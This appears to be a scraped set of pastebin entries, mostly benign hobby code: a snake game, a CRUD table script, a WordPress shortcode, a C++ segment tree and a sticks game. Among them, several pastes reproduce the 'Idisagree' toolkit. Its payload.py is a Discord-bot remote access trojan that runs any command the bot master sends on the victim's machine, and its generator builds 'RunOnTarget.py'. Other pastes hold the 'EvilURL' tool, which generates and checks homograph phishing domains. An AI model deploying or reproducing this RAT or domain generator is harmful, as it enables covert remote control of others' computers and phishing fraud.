  const updateIdName = document.querySelector('#update-row-btn').dataset.id = id;


updateBtn.onclick = () => {
    const updateNameInput = document.querySelector('#update-name-input');
    console.log(updateNameInput);

    fetch('http://127.0.0.1:5000/update', {
        method: 'PATCH',
        headers: {
            'Content-type': 'application/json'
        },
        body: JSON.stringify({
            id: updateNameInput.dataset.id,
            name: updateNameInput.value
        })
    })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                location.reload();
            }
        })
}
}
const addBtn = document.querySelector('#add-name-btn');

addBtn.onclick = () => {
    const nameInput = document.querySelector('#name-input');
    const name = nameInput.value;
    nameInput.value = '';

    fetch('http://127.0.0.1:5000/insert', {
        headers: {
            'Content-type': 'application/json'
        },
        method: 'POST',
        body: JSON.stringify({ name: name })
    })
        .then(response => response.json())
        .then(data => insertRowIntoTable(data['data']));

}

function insertRowIntoTable(data) {
    console.log(data);
    const table = document.querySelector('table tbody');
    const isTableData = table.querySelector('.no-data');

    let tableHtml = ""<tr>"";

    for (var key in data) {
        if (data.hasOwnProperty(key)) {
            if (key === 'dateAdded') {
                data[key] = new Date(data[key]).toLocaleString();
                //data[key] = new Date(data[key].toLocaleString());
            }
            tableHtml += `<td>${data[key]}</td>`;
        }
    }


    tableHtml += `<td><button class=""delete-row-btn"" data-id=${data.id}>Delete</td>`;
    tableHtml += `<td><button class=""edit-row-btn"" data-id=${data.id}>Edit</td>`;

    tableHtml += ""</tr>"";

    if (isTableData) { // if its true
        table.innerHTML = tableHtml;
    } else {
        const newRow = table.insertRow();
        newRow.innerHTML = tableHtml;
    }
}

function loadHTMLTable(data) {
    const table = document.querySelector('table tbody');


    // console.log(data);

    if (data.length === 0) {
        table.innerHTML = '<tr><td class=""no-data"" colspan=""5"">No Data</td></tr>';
        return;
    }

    let tableHtml = '';

    data.forEach(({ id, name, dateAdded }) => { // site_title
        tableHtml += '<tr>';
        tableHtml += `<td>${id}</td>`;
        tableHtml += `<td>${name}</td>`;
        // tableHtml += `<td>${site_title}</td>`;
        tableHtml += `<td>${new Date(dateAdded).toLocaleString()}</td>`;  // tableHtml += `<td>${dateAdded}</td>`;
        tableHtml += `<td><button class=""delete-row-btn"" data-id=${id}>Delete</td>`;
        tableHtml += `<td><button class=""edit-row-btn"" data-id=${id}>Edit</td>`;
        tableHtml += '</tr>';
    });


    table.innerHTML = tableHtml;
}"
xZwK3WT8,snake 3.0,AlphaPenguino,Python,Sunday 3rd of December 2023 07:14:50 AM CDT,"import turtle
import time
import random


delay = 0.1
game_Started = False
restartable = False

score = 0
hi_score = 100

wn = turtle.Screen()
wn.title(""The Ultimate Snek Game"")
wn.bgcolor(""Blue"")
wn.setup(width = 600, height = 600)
wn.tracer(0)

head = turtle.Turtle()
head.speed(0)
head.color(""pink"")
head.shape(""triangle"")
head.penup()
head.goto(0,0)
head.direction = ""stop""

segments = []

food = turtle.Turtle()
food.speed(0)
food.shape(""circle"")
food.color(""black"")
food.penup()
food.goto(0,100)

pen_text = turtle.Turtle()
pen_text.speed(0)
pen_text.shape(""square"")
pen_text.color(""white"")
pen_text.clear()
pen_text.penup()
pen_text.hideturtle()
pen_text.goto(0, 260)
pen_text.goto(0, 0)
pen_text.write(""Snake Game Original by Josh Mojica"", align=""center"", font=('Times New Roman', 25, ""bold""))
pen_text.goto(-80, -100)
pen_text.write(""Press space to Start"", align=""center"", font=('Times New Roman', 12, ""bold""))
pen_text.goto(80, -100)
pen_text.write(""Press X to Exit the game"", align=""center"", font=('Times New Roman', 12, ""bold""))
pen_text.goto(-100, -260)
pen_text.write(""Zunder Jacob A. Pacis"", align=""center"", font=('Times New Roman', 12, ""bold""))
moveset = [""w"", ""a"", ""s"", ""d""]

def moveUp():
    if head.direction != ""down"":
        head.direction = ""up""
def moveDown():
    if head.direction != ""up"":
        head.direction = ""down""
def moveRight():
    if head.direction != ""left"":
        head.direction = ""right""
def moveLeft():
    if head.direction != ""right"":
        head.direction = ""left""

moveMapping = {""up"": lambda: (head.sety(head.ycor() + 20), head.setheading(90)),""down"": lambda: (head.sety(head.ycor() - 20), head.setheading(270)),""left"": lambda: (head.setx(head.xcor() - 20), head.setheading(180)),""right"": lambda: (head.setx(head.xcor() + 20), head.setheading(0))}
def move():
    moveMapping.get(head.direction, lambda: ())()
    for segment in segments:
        if head.distance(segment) < 20:
            gameOver(score, hi_score)
            time.sleep(1)
            game_started=False
def closeGame():
    if not game_Started:
        turtle.bye()

def restartGame():
    global restartable
    if restartable:
        wn.resetscreen
        pen_text.clear()
        turtle.clear()
        head.goto(0,0)
        food.setx(random.randint(-270, 270))
        food.sety(random.randint(-270, 270))
        pen_text.goto(0, 275)

        score = 0
        pen_text.goto(0, 260)
        pen_text.goto(0, 0)
        pen_text.write(""Snake Game Original by Josh Mojica"", align=""center"", font=('Times New Roman', 25, ""bold""))
        pen_text.goto(-80, -100)
        pen_text.write(""Press space to Start"", align=""center"", font=('Times New Roman', 12, ""bold""))
        pen_text.goto(80, -100)
        pen_text.write(""Press X to Exit the game"", align=""center"", font=('Times New Roman', 12, ""bold""))
        pen_text.goto(-100, -260)
        pen_text.write(""Zunder Jacob A. Pacis"", align=""center"", font=('Times New Roman', 12, ""bold""))
        head.hideturtle()
        food.hideturtle()

def placeFood():
    food.hideturtle()
    food.setx(random.randint(-270, 270))
    food.sety(random.randint(-270, 270))
    food.showturtle()

def gameOver(finscore,finalscore):
    global restartable
    restartable = True
    for segment in segments:
        segment.goto(1000,1000)
    segments.clear()

    pen_text.clear()
    pen_text.goto(0, -50)
    pen_text.write(""Score: {} Hi-score: {}"".format(finscore, finalscore), align=""center"",
                  font=(""Consolas"", 25, ""bold""))
    turtle.hideturtle()
    turtle.clear()
    turtle.goto(0,0)
    turtle.color(""white"")
    turtle.write(""GAME OVER!"", align=""center"", font=(""Comic Sans MS"", 25, ""bold""))
    pen_text.goto(-80, -100)
    pen_text.write(""Press P to restart"", align=""center"", font=('Times New Roman', 12, ""bold""))
    pen_text.goto(80, -100)
    pen_text.write(""Press X to Exit the game"", align=""center"", font=('Times New Roman', 12, ""bold""))
    pen_text.goto(-100, -260)
    turtle.hideturtle()
    head.goto(0, 10000)
    head.color(""white"")
    head.direction = ""stop""
    food.goto(0, 1000)

    wn.bgcolor(""blue"")


def startGame():
    global game_Started, delay, score, hi_score, restartable
    if game_Started:
        return
    game_Started = True
    restartable = False
    wn.bgcolor(""purple"")
    food.showturtle()
    head.showturtle()
    score = 0
    pen_text.clear()
    pen_text.goto(0,260)
    pen_text.write(""Score: {} Hi-score: {}"".format(score, hi_score), align=""center"",
                  font=(""Consolas"", 25, ""bold""))

    while True:
        wn.update()
        if head.distance(food) < 20:
            score += 5
            placeFood()
            new_segment = turtle.Turtle()
            new_segment.speed(0)
            new_segment.shape(""circle"")
            new_segment.color(""black"")
            new_segment.penup()
            segments.append(new_segment)


            delay -= 0.001

            if score > hi_score:
                hi_score = score
            pen_text.clear()
            pen_text.write(""Score: {} Hi-score: {}"".format(score, hi_score), align=""center"",
                          font=(""Consolas"", 25, ""bold""))

        for i in range(len(segments)-1, 0, -1):
            segments[i].setx(segments[i - 1].xcor())
            segments[i].sety(segments[i - 1].ycor())

        if len(segments) > 0:
            segments[0].goto(head.xcor(), head.ycor())

        if head.xcor() > 290 or head.xcor() < -290 or head.ycor() > 290 or head.ycor() < -290:
            game_Started = False
            gameOver(score, hi_score)
            time.sleep(1)

        move()
        time.sleep(delay)
wn.listen()
mapping = {""w"": moveUp, ""s"": moveDown, ""a"": moveLeft, ""d"": moveRight, ""space"": startGame, ""x"": closeGame, ""p"": restartGame}
for key, action in mapping.items():
    wn.onkeypress(lambda a=action: a(), key)
wn.mainloop()"
Rz2xaXZk,[reviewer_experience] shortcode,geminilabs,PHP,Sunday 3rd of December 2023 06:58:23 AM CDT,"/**
 * Use the Code Snippets (https://wordpress.org/plugins/code-snippets/)
 * plugin to add this shortcode to your website.
 *
 * Example usage: 
 * [reviewer_experience assigned_posts=""post_id"" text=""{positive}% are positive reviews, {negative}% are negative reviews.""]
 */
add_shortcode('reviewer_experience', function ($content = '') {
    $args = wp_parse_args($content, [
        'text' => '{positive}% of reviewers reported a positive experience, while {negative}% reported a negative experience.',
    ]);
    $results = glsr_get_ratings($args);
    $negative = $results->ratings[0] + $results->ratings[1] + $results->ratings[2];
    $positive = $results->ratings[3] + $results->ratings[4] + $results->ratings[5];
    if ($negative > 0) {
        $negative = round($negative / $results->reviews * 100);
    }
    if ($positive > 0) {
        $positive = round($positive / $results->reviews * 100);
    }
    return str_replace(['{positive}', '{negative}'], [$positive, $negative], $args['text']);
});"
P84TRdjL,README,FlyFar,Email,Sunday 3rd of December 2023 06:29:02 AM CDT,"Idisagree v1.0
Control remote computers using Discord Bot and python 3.

[ ! ] If your target is a Windows system, you may want to compile your payload. Do this with py2exe or pyinstaller.

MAINTAINERS
Alisson Moretto | Twitter: @UndeadSec Github: @UndeadSec
PREREQUISITES
Python 3.x
pip3
subprocess from python3
Discord from python3
TESTED ON
Kali Linux - Rolling Edition

Linux Mint - 18.3 Sylvia

Ubuntu - 16.04.3 LTS

MacOS High Sierra

CLONE
git clone https://github.com/UndeadSec/Idisagree.git

RUNNING
cd Idisagree
sudo pip3 install -r requirements.txt
python3 Idisagree.py
SCREENSHOT
Shot

DISCLAIMER
TO BE USED FOR EDUCATIONAL PURPOSES ONLY

The use of the Idisagree is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program.

""DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."""
mfkcTDUJ,About Vitrine La Morte,TessCarstairs,HTML 5,Sunday 3rd of December 2023 06:25:40 AM CDT,"COR BACKGROUND: #27070d
COR DA BOX: #0000
COR DA FONTE: #615e63
 
LEMBRETES: A borda está fixa em seu perfil e os avatares precisam ser de 196x300 ou maior.
 
CÓDIGO PARA ABOUT HTML:
<div
    style=""
        width: 1966px;
        height: 894px;
        background: url('https://i.postimg.cc/fWD0pMxG/about-la-morte.png');
        margin: -75px -698px;
    background-repeat:no-repeat;
    ""
    class=""uk-position-relative side-main-user""
>
    <div style=""margin-left: 733px; margin-top: 704px"">
        <a href=""URL AQUI"" alt=""ADICIONAR""
            ><img
                src=""https://i.postimg.cc/cCf0TSw-Z/links.png""
                alt=""ADICIONAR""
        />
    <a href=""URL AQUI""
            ><img
                src=""https://i.postimg.cc/cCf0TSw-Z/links.png""
                alt=""REMOVER""
        style=""margin-left: 43px""
        />
    <a href=""URL AQUI"" alt=""RECADOS""
            ><img
                src=""https://i.postimg.cc/cCf0TSw-Z/links.png""
                alt=""RECADOS""
        style=""margin-left: 45px;""
        />
    <a href=""URL AQUI"" alt=""AMIGOS""
            ><img
                src=""https://i.postimg.cc/cCf0TSw-Z/links.png""
                alt=""AMIGOS""
        style=""margin-left: 35px""
        />
    <a href=""URL AQUI"" alt=""DEPOIMENTOS""
            ><img
                src=""https://i.postimg.cc/cCf0TSw-Z/links.png""
                alt=""DEPOIMENTOS""
        style=""margin-left: 40px""
        />
    </div>
</div>  "
92ezTD2N,payload.py,FlyFar,Python,Sunday 3rd of December 2023 06:25:13 AM CDT,"import discord
import subprocess

client = discord.Client()

@client.event
async def on_message(message):

    if message.content:
        if str(message.author) == botMaster:
            comando = subprocess.getoutput(str(message.content))
            msg = 'Command granted by {0.author.mention}\n{1}'.format(message, comando)
            await client.send_message(message.channel, msg)	


@client.event
async def on_ready():
    print('Logged in as')
    print(client.user.name)
    print(client.user.id)
    print('------')

client.run(botToken)"
WVdXscKZ,Idisagree.py,FlyFar,Python,Sunday 3rd of December 2023 06:22:45 AM CDT,"#       Idisagree
#     by: UNDEADSEC
#
###########################
from __future__ import print_function
from os import system
RED, CYAN, GREEN, END = '\033[91m', '\033[36m', '\033[1;32m', '\033[0m'

def ascii():
    system('clear')
    print('''
{2}  (\____/){2}-{1} UNDEADSEC {2}|{1} t.me/UndeadSec {2}|{1} youtube.com/c/UndeadSec {2}- BRAZIL
{2}   (_oo_)       {2}██{0}      ██ ██ ██████ ██████ ██████      ██████ ██████{1}
{2}     (O)        {2}██{0}      ██    ██         ██ ██     ██   ██  ██ ██  ██{1}
{2}   __||__    \) {2}██{0}  ██████ ██ ██████ ██████ ██ ███ ████ ██████ ██████{1}
{2}[]/______\[] /  {2}██{0}  ██  ██ ██     ██ ██  ██ ██  ██ ██   ██     ██{1}
{2}/ \______/ \/   {2}██{0}  ██████ ██ ██████ ██████ ██████ ██   ██████ ██████{1}
{2}    /__\              {2}CONTROL REMOTE COMPUTERS USING DISCORD BOT{1} v1.0
                                            Stay tuned on Twitter: @UndeadSec
{3}[{1}?{3}]{1} IT'S YOUR FIRST TIME HERE?
{3}:{1} FOLLOW THESE STEPS:

{3}>{1} CREATE AN ACCOUNT AT DISCORD AND GET YOUR DISCORD ID. EXAMPLE: TEST#0000
({2}https://discordapp.com/{1})
{3}>{1} CREATE A DISCORD SERVER 
({2}https://discordapp.com/{1})
{3}>{1} CREATE AN DISCORD APP AND MAKE YOUR APP INTO A BOT 
({2}https://discordapp.com/developers/applications/me#top{1})
{3}>{1} GET THE BOT TOKEN 
({2}https://discordapp.com/developers/applications/me#top{1})
{3}>{1} ADD BOT TO YOUR DISCORD SERVER
({2}Complete tutorial: https://github.com/UndeadSec/Idisagree{1})'''.format(RED, END, CYAN, GREEN))

def end():
    system('clear')
    print('''
            {3}I{1} 
       ;     /        ,--.     
       [{3}""{1}]   [{3}""{1}]  ,<  |__{3}**{1}|    
      /[_]\  [~]\/    |//  |    
       ] [   OOO      /o|__|
              {3}DISAGREE{1}
   
{1}[ {0}Watch us on YouTube:{1} https://youtube.com/c/UndeadSec ]
[ {0}Follow me on Twitter:{1} https://twitter.com/A1S0N_ ]
[ {0}Contribute on Github:{1} https://github.com/UndeadSec/Idisagree ]
[ {0}Join our Telegram Group(Portuguese):{1} https://t.me/UndeadSec ]\n'''.format(GREEN, END, CYAN, RED))

def generate(botToken, botMaster):
    info = 'botToken = ' + '\'' + botToken + '\'' +'\nbotMaster = ' + '\'' + botMaster + '\'' 
    with open('payload.py','r') as contents:
        save = contents.read()
    with open('RunOnTarget.py','w') as contents:
        contents.write(info)
    with open('RunOnTarget.py','a') as contents:
        contents.write(save)
    return('{0}[{1}*{0}]{1} Saved as {2}RunOnTarget.py{1}'.format(GREEN, END, RED))

def config():   
    botToken = input('\n[{0}I{1}disagree{2}] BOT TOKEN: '.format(CYAN, RED, END))
    botMaster = input('[{0}I{1}disagree{2}] BOT MASTER: '.format(CYAN, RED, END))
    print('\n[~] Configuration:\n [BOT TOKEN] =' + botToken + '\n [BOT MASTER] = ' + botMaster)
    confirm = input('\nConfirm ? (y/n) : ')
    if confirm.upper() == 'Y':
        print(generate(botToken, botMaster))
    else:
        config()

def main():
    ascii()
    config()

if __name__ == ""__main__"":
    try:
        main()
    except KeyboardInterrupt:
        end()
        exit(0)"
zTZH1WZx,README,FlyFar,Email,Sunday 3rd of December 2023 06:12:25 AM CDT,"EvilURL v3.0
Generate Unicode domains for IDN Homograph Attacks and detect them.

The EvilURL is released under a BSD-style license. See LICENSE for more details.

CLONE
git clone https://github.com/UndeadSec/EvilURL.git

INSTALL
pip install python-nmap python-whois

RUNNING
cd EvilURL
python3 evilurl.py

VIDEO:
https://www.youtube.com/watch?v=COyFfSlexTw

DISCLAIMER
TO BE USED FOR EDUCATIONAL PURPOSES ONLY

The use of the EvilURL is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program.

""DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."" Taken from LICENSE.

CHANGELOG
- Improved permutations
- Full script updated to CLI
- Check domains from lists
- Check available domains
- Check domains connection
- Logging"
yrH84c70,test.txt,FlyFar,Email,Sunday 3rd of December 2023 06:09:55 AM CDT,"example.com
github.com
exаmрle.com"
hPRsduww,evilurl.py,FlyFar,Python,Sunday 3rd of December 2023 06:09:10 AM CDT,"#!/usr/bin/env python
#------------------------------------------------------
#      BY: UNDEADSEC from BRAZIL :)
#      YouTube: https://www.youtube.com/c/UndeadSec
#      Github: https://github.com/UndeadSec/EvilURL
#------------------------------------------------------
from platform import python_version
from sys import exit, argv
from argparse import ArgumentParser
from nmap import PortScanner
from whois import whois

version = python_version().startswith('2', 0, len(python_version()))
if version:
    print('Are you using python version {}\n'
          'Please, use version 3.X of python'.format(python_version()))
    exit(1)

from os import system

RED, WHITE, GREEN, END, YELLOW = '\033[91m', '\33[97m', '\033[1;32m', '\033[0m', '\33[93m'

unicodes = [{'\u0430':'Cyrillic Small Letter A'},
         {'\u03F2':'Greek Lunate Sigma Symbol'},
         {'\u0435':'Cyrillic Small Letter Ie'},
         {'\u043E':'Cyrillic Small Letter O'},
         {'\u0440':'Cyrillic Small Letter Er'},
         {'\u0455':'Cyrillic Small Letter Dze'},
         {'\u0501':'Cyrillic Small Letter Komi De'},
         {'\u051B':'Cyrillic Small Letter Qa'},
         {'\u051D':'Cyrillic Small Letter We'}]

def message(output=False):
    system('clear')
    printParser('''{0}                                                                   
{0}88888888888           88  88{1}  88        88  88888888ba   88           
{0}88                    """"  88{1}  88        88  88      ""8b  88           
{0}88                        88{1}  88        88  88      ,8P  88           
{0}88aaaaa  8b       d8  88  88{1}  88        88  88aaaaaa8P'  88           
{0}88""""""""""  `8b     d8'  88  88{1}  88        88  88""""""""88'    88      v3.0     
{0}88        `8b   d8'   88  88{1}  88        88  88    `8b    88           
{0}88         `8b,d8'    88  88{1}  Y8a.    .a8P  88     `8b   88           
{0}88888888888  ""8""      88  88{1}   `""Y8888Y""'   88      `8b  88888888  {1}

[ by UNDEAD{0}SEC{1} - Alisson Moretto @UndeadSec ]\n'''.format(RED, END), output)

def cleanTxt(txt):
    for i in (RED, WHITE, GREEN, END, YELLOW):
        txt = txt.replace(i, '')
    return txt

def cleanFile(output):
    arq = open(output, 'w')
    arq.write('')
    arq.close()

def checkAval(domain):
    try:
        return whois(domain).registrar
    except:
        return None

def printParser(txt, output=False):
    print(txt)
    if output:
        arq = open(output, 'a')
        arq.write(cleanTxt(txt)+'\n')
        arq.close()

def printOriginal(url, checkConnection, output):
    printParser('{0}[{1}~{0}]{1} Original: {2}'.format(GREEN, END, url), output)
    if checkConnection: printParser(check_url(url), output)

def makeEvil(char, unicd, uninum, newurl, oldurl, output):
    printParser('\n{0}[{1}*{0}]{1} Domain name: %s\n{0}[{1}*{0}]{1} Char replaced: %s\n{0}[{1}*{0}]{1} Using Unicode: %s\n{0}[{1}*{0}]{1} Unicode number: %s\n{0}[{1}*{0}]{1} Evil URL: {3}%s{1}'.format(GREEN, END, YELLOW, RED) % (oldurl, char, unicd, uninum, newurl), output)

import itertools

def gen(url, tld, checkConnection=False, output=False, aval=False):
    url = url.lower()

    evils = [{'a':'\u0430'},{'c': '\u03F2'}, {'e': '\u0435'}, {'o': '\u043E'}, {'p': '\u0440'}, {'s': '\u0455'}, {'d': '\u0501'}, {'q': '\u051B'}, {'w': '\u051D'}]
    e_matchs = []

    for em in evils:
        if list(em)[0].upper() in url.upper():
            e_matchs.append(list(em)[0])

    cst = ''
    for ch in e_matchs:
        cst += list(ch)[0]

    words = []
    for i in range(1, 9):
        for j in itertools.combinations(cst, i):
            temp = ''.join(j)
            words.append(temp)

    for word in words:
        newurl = url
        unicd = []
        name = []
        chars = []
        for w in word:
            for em in evils:
                if list(em)[0] == w:
                    chr = em[list(em)[0]]
                    unicd.append(chr)
                    chars.append(w)
                    for u in unicodes:
                        if list(u)[0] == chr:
                            name.append(u[chr])
                    newurl = newurl.replace(w, chr)
        makeEvil(chars, unicd, name, newurl+tld, url, output)
        if checkConnection: printParser(check_url(newurl+tld), output)
        if aval:
            if checkAval(newurl+tld) is None:
                printParser('{0}[{1}*{0}]{1} Available domain'.format(GREEN, END), output)
            else:
                printParser('{0}[{1}!{0}]{1} Unavailable domain'.format(YELLOW, END), output)

# -------------- BEGIN CHECKURL MODULE----------------- #
def check_url(url):

    '''
    Check connection
    :param url: suspicious url
    :return: status of connection
    '''

    nmScan = PortScanner()
    result = nmScan.scan(url, arguments='-sn')

    if int(result['nmap']['scanstats']['uphosts']) > 0:
        msg = '{0}[{1}*{0}]{1} Connection test: UP'.format(GREEN, END)
    else:
        msg = '{0}[{1}!{0}]{1} Connection test: DOWN'.format(YELLOW, END)

    return msg

def check_EVIL(url):

    '''
    Check evil chars in URL
    :param url: suspicious URL
    :return: result of check and the evil chars
    '''

    bad_chars = ['\u0430', '\u03F2', '\u0435', '\u043E', '\u0440', '\u0455', '\u0501', '\u051B', '\u051D']
    result = [bad_chars[i] for i in range(len(bad_chars)) if bad_chars[i] in url]

    if result:
        msg = '{0}[{1}*{0}]{1} Evil URL detected: {2}{3}{1}'.format(GREEN,END,RED,url)
        msg += '\n{0}[{1}*{0}]{1} Unicode characters used: {2}'.format(GREEN,END,result)
    else:
        msg = '{0}[{1}!{0}]{1} Evil URL NOT detected: {2}'.format(YELLOW, END, url)

    return msg

def urls_list(file, checkConnection, output):
    '''
    Read the file to verify Evil URL
    :param file: file with a list of Evil URLs 
    :return: file reading
    '''

    with open(file) as arq:
        urls = [f.strip() for f in arq]
    for i in range(len(urls)):
        printParser(check_EVIL(urls[i]), output)
        if checkConnection:
            printParser(check_url(urls[i]), output)
        printParser('', output)

# -------------- END CHECKURL MODULE ----------------- #

def parseHandler():
    parser = ArgumentParser(usage=""evilurl.py [options]"", description=""Generate unicode evil domains for IDN Homograph Attack and detect them."")
    parser.add_argument(""-g"", dest=""generate"", action=""store_true"", help=""Generate unicode evil domains"")
    parser.add_argument(""-d"", dest=""domain"", help=""Domain name with termination (example.com)"")
    parser.add_argument(""-c"", dest=""checkConnection"", action=""store_true"", help=""Check generated/input domain connections"")
    parser.add_argument(""-o"", dest=""output"", help=""Save generated evil domains to a file"")
    parser.add_argument(""-f"", dest=""filepath"", help=""Import domains from a file and check them"")
    parser.add_argument(""-a"", dest=""aval"", action=""store_true"", help=""Check if domain is available"")

    if len(argv) == 1:
        parser.print_help()
        exit(1)
    
    args = parser.parse_args()
    domain = '' if args.domain is None else args.domain
    generate = args.generate
    checkConnection = args.checkConnection
    filepath = args.filepath
    output = args.output
    aval = args.aval
    tld = ''
    for x in domain.split('.')[1:]:
        tld += '.' + x
    if output:
        cleanFile(output)
        message(output)
    if generate and not domain or generate and domain and filepath or domain and filepath:
        parser.print_help()
    elif generate and len(domain) > 0:        
        printOriginal(domain, checkConnection, output)
        gen(domain.split('.')[0], tld, checkConnection, output, aval)
    elif len(domain) > 0:
        printParser(check_EVIL(domain), output)
    elif filepath:
        urls_list(filepath, checkConnection, output)
    if checkConnection and not filepath and not generate:
        printParser(check_url(domain), output)
    if output:
        print('\n{1}[{2}*{1}]{2} Logs stored to {0}'.format(output, GREEN, END))

if __name__ == '__main__':
    try:
        message()
        parseHandler()
    except KeyboardInterrupt:
        exit()"
E4RnP7T7,Sticks,plarmi,Python,Sunday 3rd of December 2023 06:05:54 AM CDT,"# https://habr.com/ru/sandbox/149940/

from tkinter import *
from random import *

left = 20

def s1():
  global left
  u = 1
  left = left - int(u)
  if left <= 0:
    sticks.config(text = ""Компьютер победил"")
    sticks.place(x=75, y=70)
  else:
    sticks.config(text = left*""| "")

def s2():
  global left
  u = 2
  left = left - int(u)
  if left <= 0:
    sticks.config(text = ""Компьютер победил"")
    sticks.place(x=75, y=70)
  else:
    sticks.config(text = left*""| "")

def s3():
  global left
  u = 3
  left = left - u
  if left <= 0:
    sticks.config(text = ""Компьютер победил"")
    sticks.place(x=75, y=70)
  else:
    sticks.config(text = left * ""| "")

def pc():
  global left
  a = randint(1, 3)
  if left == 4:
    a = 3
  elif left == 3:
    a = 2
  elif left == 2:
    a = 1
  left = left - int(a)
  if left <= 0:
    sticks.config(text = ""Игрок победил"")
    sticks.place(x=140, y=70)
  else:
    sticks.config(text = left*""| "")

root = Tk()
root.geometry(""550x200"")

text1 = Label(root, text=""Сколько палочек будем брать?"")
text1.pack()

wbutt1 = Button(root, text=""1"", command = s1)
wbutt1.place(x=210, y=30)

wbutt2 = Button(root, text=""2"", command = s2)
wbutt2.place(x=265, y=30)

wbutt3 = Button(root, text=""3"", command = s3)
wbutt3.place(x=320, y=30)

sticks = Label(root, text = left*""| "")
sticks.config(font = (""Arial"", 30, 'bold'))
sticks.place(x=50, y=70)

pc_butt = Button(root, text = ""Ход компьютера"", command = pc)
pc_butt.place(x=170, y=150)

root.resizable(0, 0)
root.title(""Sticks"")
root.mainloop()"
x0ykNNht,Untitled,Josif_tepe,C++,Sunday 3rd of December 2023 06:00:28 AM CDT,"#include <iostream>
#include <set>
#include <vector>
#include <map>
#include <bits/stdc++.h>
 
using namespace std;
typedef long long ll;
const int maxn = 2e5 + 10;
 
ll segment_tree[3 * maxn];
void build_tree(int L, int R, int position) {
    if(L == R) {
        segment_tree[position] = 0;
    }
    else {
        int middle = (L + R) / 2;
        build_tree(L, middle, 2 * position);
        build_tree(middle + 1, R, 2 * position + 1);
        segment_tree[position] = segment_tree[2 * position] + segment_tree[2 * position + 1];
    }
}
// L R i L R j L R
ll query(int L, int R, int position, int i, int j) {
    if(i <= L and R <= j) {
        return segment_tree[position];
    }
    if(R < i or j < L) {
        return 0;
    }
    int middle = (L + R) / 2;
    return query(L, middle, 2 * position, i, j) + query(middle + 1, R, 2 * position + 1, i, j);
}
void update(int L, int R, int position, int idx, ll new_val) {
    if(L == R) {
        segment_tree[position] += new_val;
        return;
    }
    int middle = (L + R) / 2;
    if(idx <= middle) {
        update(L, middle, 2 * position, idx, new_val);
    }
    else {
        update(middle + 1, R, 2 * position + 1, idx, new_val);
    }
    segment_tree[position] = segment_tree[2 * position] + segment_tree[2 * position + 1];
}
struct node {
    int v, k, idx;
    node () {}
    node(int _idx, int _v, int _k) {
        idx = _idx;
        v = _v;
        k = _k;
    }
    bool operator < (const node &tmp) const {
        return v < tmp.v;
    }
};
int main() {
    ios_base::sync_with_stdio(false);
    int n;
    cin >> n;
    vector<pair<int, int> > original_values;
    vector<node> to_be_compressed;
    for(int i = 0; i < n; i++) {
        int a, b;
        cin >> a >> b;
        original_values.push_back(make_pair(a, b));
        to_be_compressed.push_back(node(i, a, b));
    }
    sort(to_be_compressed.begin(), to_be_compressed.end());
    map<int, int> mapa;
    int c = 0;
    for(int i = 0; i < n; i++) {
        if(mapa.find(to_be_compressed[i].v) == mapa.end()) {
            mapa[to_be_compressed[i].v] = c;
            c++;
        }
    }
    vector<pair<int, int> > compressed_values(n);
    map<int, int> orig_value;
    for(int i = 0; i < n; i++) {
        compressed_values[to_be_compressed[i].idx] = make_pair(mapa[to_be_compressed[i].v],to_be_compressed[i].k);
        orig_value[mapa[to_be_compressed[i].v]] = to_be_compressed[i].v;
    }
    build_tree(0, n + 1, 1);
    ll sum = 0;
    for(int i = 0; i < n; i++) {
        int v = compressed_values[i].first, k = compressed_values[i].second;
        sum += k;
        update(0, n, 1, v, k);
        int L = 0, R = n;
        while(L < R) {
            int middle = L + (R - L) / 2;
            if(query(0, n, 1, 0, middle) >= (sum + 1) / 2) {
                R = middle;
            }
            else {
                L = middle + 1;
            }
        }
        cout << orig_value[L] << ""\n"";
    }
    return 0;
}"
E6BNv03Z,data771,TestGuy1,JSON,Sunday 3rd of December 2023 06:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '584a905f5ccab94fbb650f1ca5094abe733c8ef43da1d2d2711325d1a9ad387394c094095dd6ed63f5ca41870b39b4391701ea2d02a1d4c05fc304c1e85548a904a7755d7621c4803e02a501874acc48ff8738050f7fecbf8bdefe3563ead6b49f46f5cd7bf97d444fc2ddcf1b801893a92592e65619548f02854256d196a510',
  otherdata: [
    'eed70fd248be3ff6849b54e5a5b7c969',
    '3215679022b57fd68b75fb2462fbe666',
    '1724b9593528902c300772cbd1d5c88d',
    'ed364e185fe845207e68a3837df2aa5b',
    'b3494ae945c2d551f9b5ff9cad876107',
    '06de7f20bf1b8d96f72eee42381dad31',
    'b42139e4541fb7dd3c732d660d933184',
    'a51116233f74ab0561ccd29b65a940b5'
  ]
}"
LDSi0R1p,Day 3 python,icarussiano,Python,Sunday 3rd of December 2023 05:39:41 AM CDT,"import re

with open(""input"") as file:
    data = file.read().splitlines()
num = []
sym = []
gear = []
part1 = 0
part2 = 0

for line in data:
    num.append([(int(m.group()),m.start(), m.end() - 1) for m in re.finditer(r'(\d+)', line)])
